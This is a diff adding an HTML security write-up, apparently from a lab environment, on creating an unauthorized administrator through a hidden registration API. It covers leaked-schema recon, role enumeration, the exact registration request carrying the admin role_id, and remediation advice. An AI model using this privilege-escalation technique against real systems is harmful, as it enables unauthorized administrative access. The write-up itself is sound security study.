@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Analysis: Unauthorized Admin Creation | Research Lab</title>
+    <meta name="description" content="Technical analysis of Unauthorized Admin Creation via Hidden API Registration conducted in a controlled environment by Primandito Adi Setiya.">
+    <meta name="robots" content="index, follow">
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        :root { --bg: #0a0a0a; --accent: #ff5555; --border: #222; --text-main: #f0f0f0; --text-dim: #888; --code-green: #00ff41; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text-main); line-height: 1.7; padding: 40px 20px; }
+        .container { max-width: 850px; margin: 0 auto; }
+        .back-nav { margin-bottom: 40px; }
+        .back-link { font-family: 'IBM Plex Mono', monospace; color: var(--accent); text-decoration: none; font-size: 0.8rem; border: 1px solid var(--accent); padding: 8px 15px; transition: 0.3s; }
+        .back-link:hover { background: var(--accent); color: #fff; }
+        header { margin-bottom: 50px; border-bottom: 1px solid var(--border); padding-bottom: 20px; }
+        h1 { font-size: clamp(1.4rem, 4vw, 1.8rem); font-family: 'IBM Plex Mono', monospace; margin-bottom: 10px; color: #fff; }
+        .meta-info { font-family: 'IBM Plex Mono', monospace; font-size: 0.75rem; color: var(--text-dim); display: flex; gap: 20px; flex-wrap: wrap; }
+        .meta-info span b { color: var(--accent); }
+        .summary-box { background: #111; border: 1px solid var(--border); padding: 25px; margin-bottom: 40px; }
+        .summary-box h2 { font-family: 'IBM Plex Mono', monospace; font-size: 1rem; color: #fff; margin-bottom: 10px; border-left: 3px solid var(--accent); padding-left: 15px; }
+        section { margin-bottom: 50px; }
+        h2 { font-family: 'IBM Plex Mono', monospace; font-size: 1.1rem; color: #fff; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        h2::before { content: "> "; color: var(--accent); }
+        .video-container { width: 100%; aspect-ratio: 16/9; background: #000; border: 1px solid var(--border); position: relative; margin-bottom: 15px; }
+        .video-container iframe { position: absolute; top:0; left:0; width:100%; height:100%; border:none; }
+        pre { background: #000; border: 1px solid var(--border); padding: 20px; overflow-x: auto; margin: 20px 0; position: relative; }
+        code { font-family: 'IBM Plex Mono', monospace; font-size: 0.9rem; color: var(--code-green); }
+        .code-label { position: absolute; top: 0; right: 0; background: var(--border); color: #666; font-size: 0.6rem; padding: 3px 10px; }
+        footer { margin-top: 100px; padding-top: 30px; border-top: 1px solid var(--border); text-align: center; font-family: 'IBM Plex Mono', monospace; font-size: 0.75rem; color: #444; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <nav class="back-nav"><a href="../index.html" class="back-link">[ BACK_TO_LAB_INDEX ]</a></nav>
+
+        <header>
+            <h1>Unauthorized Admin Creation via Hidden API Registration</h1>
+            <div class="meta-info">
+                <span>DATE: <b>2026-08-12</b></span>
+                <span>SEVERITY: <b>CRITICAL</b></span>
+                <span>CATEGORY: <b>BROKEN_ACCESS_CONTROL</b></span>
+            </div>
+        </header>
+
+        <div class="summary-box">
+            <h2>EXECUTIVE SUMMARY</h2>
+            <p>
+                This analysis demonstrates a <strong>Critical</strong> vulnerability in the Sentinel Gate infrastructure. While the frontend lacks a registration page (returning a 404 error), the underlying API remains active. By leveraging verbose error messages and role enumeration, an attacker can provision a new account with <strong>System Administrator</strong> privileges, bypassing all intended access controls.
+            </p>
+        </div>
+
+        <section class="video-section">
+            <h2>EXPLOITATION_POC (VIDEO)</h2>
+            <div class="video-container">
+                <!-- Replace VIDEO_ID with your actual YouTube ID -->
+                <iframe width="560" height="315" src="https://www.youtube.com/embed/y7tFzZlQjFA?si=Yzhs5HbyLR7tH6vh" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+            </div>
+        </section>
+
+        <section>
+            <h2>TECHNICAL_WALKTHROUGH</h2>
+            <p><b>1. Reconnaissance:</b> Initial inspection of <code>/register</code> returned a standard 404 page. However, intercepting the login request revealed an active API structure under <code>/api/v1/auth/login</code>.</p>
+
+            <p><b>2. Schema Discovery:</b> By changing the endpoint to <code>/register</code> in Burp Repeater and sending an empty payload, the server leaked the required JSON schema for account creation.</p>
+            
+            <pre><span class="code-label">API_SCHEMA_LEAK</span><code>
+HTTP/1.1 400 BAD REQUEST
+{
+    "status": "validation_error",
+    "required_schema": ["full_name", "email", "password", "confirm_password", "role_id"]
+}</code></pre>
+
+            <p><b>3. Role Enumeration:</b> Further investigation of the API revealed an unsecured roles endpoint. Fetching <code>GET /api/v1/roles</code> provided the unique identifier for the administrative role.</p>
+
+            <pre><span class="code-label">ROLE_ENUMERATION_LOG</span><code>
+{
+    "role_id": "RL-9928-ADM-X",
+    "name": "System Administrator",
+    "description": "Full administrative control..."
+}</code></pre>
+
+            <p><b>4. Exploitation:</b> A registration request was crafted using the identity <b>"Hacked By Primz"</b> and the leaked <code>role_id</code>. The server accepted the request, returning a <b>201 Created</b> status.</p>
+
+            <pre><span class="code-label">BURP_REPEATER_PAYLOAD</span><code>
+POST /api/v1/auth/register HTTP/1.1
+{
+    "full_name": "Hacked By Primz",
+    "email": "hacked@redacted.com",
+    "password": "admin",
+    "confirm_password": "admin",
+    "role_id": "RL-9928-ADM-X"
+}</code></pre>
+
+            <p><b>5. Impact:</b> Using the new credentials, access was granted to the <b>Central Control Console</b>, exposing encrypted network statuses and node configurations.</p>
+        </section>
+
+        <section>
+            <h2>REMEDIATION_STRATEGY</h2>
+            <p>
+                To mitigate this vulnerability, the <span class="highlight">registration API should be entirely disabled</span> if not required. Furthermore, administrative roles must never be assignable via public endpoints. Implement <span class="highlight">Server-Side Role Mapping</span> where only pre-authorized identities can hold elevated privileges.
+            </p>
+        </section>
+
+        <footer>© 2026 PRIMANDITO ADI SETIYA // SECURITY_RESEARCH_WRITEUP</footer>
+    </div>
+</body>
+</html>
